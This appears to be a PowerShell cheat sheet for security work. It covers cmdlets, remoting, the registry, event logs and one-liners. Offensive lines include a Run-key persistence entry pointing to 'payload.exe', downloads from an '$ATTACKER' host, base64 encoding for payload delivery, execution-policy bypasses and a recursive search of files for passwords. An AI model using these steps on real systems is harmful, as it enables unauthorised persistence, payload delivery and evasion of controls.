Microsoft's task automation shell and scripting language. Built on .NET — cmdlets return objects rather than text, making data manipulation significantly more powerful than cmd.exe. PowerShell 7+ (cross-platform, open source) is distinct from Windows PowerShell 5.1 (built into Windows). Most security work and administration uses 5.1 on Windows targets.

Core Concepts

POWERSHELL 
# Cmdlet format: Verb-Noun
Get-Process
Stop-Service -Name "wuauserv"

# Pipeline — pass objects between cmdlets
Get-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU

# Get help
Get-Help Get-Process
Get-Help Get-Process -Examples
Get-Command *service*         # find cmdlets matching a pattern

# Aliases (common Linux equivalents)
ls   # Get-ChildItem
cd   # Set-Location
cat  # Get-Content
ps   # Get-Process
kill # Stop-Process

# Navigation

# File operations

Move-Item file.txt C:\Temp\file_moved.txt
Remove-Item file.txt
Remove-Item C:\Temp\ -Recurse -Force
New-Item -ItemType Directory -Path C:\Temp\NewFolder
New-Item -ItemType File -Path C:\Temp\new.txt

# Read / write files
Get-Content C:\file.txt
Set-Content C:\file.txt "content"
Add-Content C:\file.txt "append this"
Get-Content C:\file.txt | Select-String "password"  # grep equivalent

Remote Management

POWERSHELL 
# WinRM must be enabled on target: Enable-PSRemoting
# Run commands on remote machine
Invoke-Command -ComputerName $TARGET -ScriptBlock { Get-Process }

# Interactive remote session
Enter-PSSession -ComputerName $TARGET
Enter-PSSession -ComputerName $TARGET -Credential (Get-Credential)
Exit-PSSession

# Pass credentials without prompt
$cred = New-Object System.Management.Automation.PSCredential("user", (ConvertTo-SecureString "pass" -AsPlainText -Force))
Enter-PSSession -ComputerName $TARGET -Credential $cred

Registry

POWERSHELL 
# Navigate registry like a filesystem
Set-Location HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Run

# Read a value
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Write a value (persistence)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Updater" -Value "C:\Temp\payload.exe"

# Delete a value
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Updater"

Useful One-Liners

POWERSHELL 
# Find files containing a string (recursive)
Get-ChildItem -Recurse | Select-String "password" | Select-Object Path, Line

# Download a file
Invoke-WebRequest -Uri "http://$ATTACKER/file.exe" -OutFile "C:\Temp\file.exe"
(New-Object Net.WebClient).DownloadFile("http://$ATTACKER/file.exe","C:\Temp\file.exe")

# Base64 encode/decode (useful for payload delivery)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("whoami"))
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("dwBoAG8AYQBtAGkA"))

# Execute base64-encoded command (common in offensive tooling)
powershell -EncodedCommand <base64>

# Check execution policy
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process -Force   # bypass for current session

# Bypass execution policy without changing it
powershell -ExecutionPolicy Bypass -File script.ps1

# Get system info
Get-ComputerInfo
[System.Environment]::OSVersion

Event Log Queries

POWERSHELL 
# Query event logs
Get-EventLog -LogName Security -Newest 50
Get-EventLog -LogName Security -InstanceId 4624   # successful logons
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 100

# Filter by time
Get-EventLog -LogName System -After (Get-Date).AddHours(-24)

See Windows Event Logs for Event ID reference.

Tips

  • Use Get-Help and Get-Command constantly — PowerShell's built-in help is comprehensive and includes examples
  • The pipeline is the core skill — chaining Where-Object and Select-Object handles most data filtering without external tools
  • Invoke-WebRequest (iwr) and (New-Object Net.WebClient) are the two standard download methods — know both since one may be blocked on hardened targets
  • Execution policy is not a security boundary — it can be bypassed trivially; on a target system do not rely on it to prevent malicious scripts from running
  • Transcription logging (Start-Transcript) and ScriptBlock logging write all executed PowerShell to event logs — assume all PowerShell activity is logged on hardened environments
